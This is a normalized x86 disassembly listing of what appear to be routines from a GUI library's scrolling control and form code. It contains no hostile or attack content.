mov eax [ ebx + 0x4 ]
call sub_440b28
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_440b28
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_4406e0
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_4406e0
jmp r-xdata
call sub_4514e0
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_451e34
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4523e8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_451eec
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
call sub_425ce0
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
call sub_425ce0
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
call sub_425ce0
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41c768
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
call sub_425ce0
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
call sub_425ce0
sub_451ff4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_451908
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_451908
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_451eec
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_451d70
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_451908
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_45210c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c854
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_451588
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_451588
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_452184
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403104
mov eax [ esi + 0x20c ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c978
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4521d0
push ebx
mov ebx eax
mov eax ebx
call sub_43dae0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_4523e8
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40bd50
test al al
jne r-xdata
mov eax ebx
call sub_440b28
push eax
call sub_425d14
sub_452210
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_452368
mov ecx edi
mov edx esi
mov eax ebx
call sub_43d228
pop edi
pop esi
pop ebx
retn
sub_452250
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_452358
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_439d50
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_451820
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_451d70
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413c10
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_439abc
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45235f
mov eax [ ebp - 0x10 ]
call sub_403104
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_451668
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_413d6c
xor ecx ecx
mov edx 0xb03e
call sub_43b4f4
inc ebx
dec esi
jne r-xdata
sub_45238c
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_451ec0
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_451ec0
mov eax ebx
call sub_452368
jmp r-xdata
sub_4523e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_440e2c
test al al
je r-xdata
xor eax eax
push ebp
push sub_4524d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_451988
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_451988
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_451ff4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_451ff4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_451ff4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_451ff4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_451ff4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_451ff4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4524f8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_439e64
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_439e90
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_439e64
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_439e90
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_439d50
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_451d70
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_439d50
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_439d94
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_451d70
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_439d50
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_451d70
mov eax ebx
call sub_439d50
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_439d94
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_439d94
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_451d70
mov eax ebx
call sub_439d94
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_45264c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_451d70
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_451d70
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_451ec0
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_451ec0
sub_4526f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45264c
mov ecx edi
mov edx esi
mov eax ebx
call sub_440634
pop edi
pop esi
pop ebx
retn
sub_452718
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_452782
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f114
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452789
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_452789
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4527c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_452368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4527c8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4527c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4523e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_45283c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_439d94
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4240b8
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_439d50
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4240b8
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412960
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_43cb94
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4528ac
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45290d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403290
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43fea4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452914
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_45293c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452aa0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_452a80
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_40304c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403428
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452a87
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_452a48
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413b2c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403054
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
sub_452ac8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403300
and [ ebx + 0x2f4 ] 0xdf
sub_452b00
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45210c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_439abc
xor edx edx
mov eax ebx
call sub_439ae0
mov edx 0x140
mov eax ebx
call sub_439b08
mov edx 0xf0
mov eax ebx
call sub_439b2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4235fc
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45341c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d544
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_438f28
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_40304c
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_453780
xor edx edx
mov eax ebx
call sub_43a510
xor edx edx
mov eax ebx
call sub_43a478
mov dl 0x1
mov eax ebx
call sub_440c68
mov edx ebx
mov eax [ rw-data ]
call sub_457de4
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_452c79
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419af4
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_413eb0
xor edx edx
mov eax ebx
call sub_416a78
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_456c8c
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_452ce4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403490
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_452dae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455608
mov eax [ ebp - 0x4 ]
call sub_440e2c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_457e1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403104
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403104
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d078
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_452184
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452db5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_452dc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_452e09
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_453780
sub_452e0e
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403300
test al al
jne r-xdata
call sub_40390c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4038b8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_453780
sub_452e44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_452e85
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_452ea4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43c3fc
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403300
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45514c
sub_452ee0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43981c
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413c10
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_454544
mov edx esi
mov eax ebp
call sub_413eb0
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45451c
mov edx esi
mov eax edi
call sub_454544
jmp r-xdata
xor edx edx
mov eax edi
call sub_4544f8
sub_452fec
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d3c0
xor edx edx
push ebp
push sub_453242
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43cb1c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
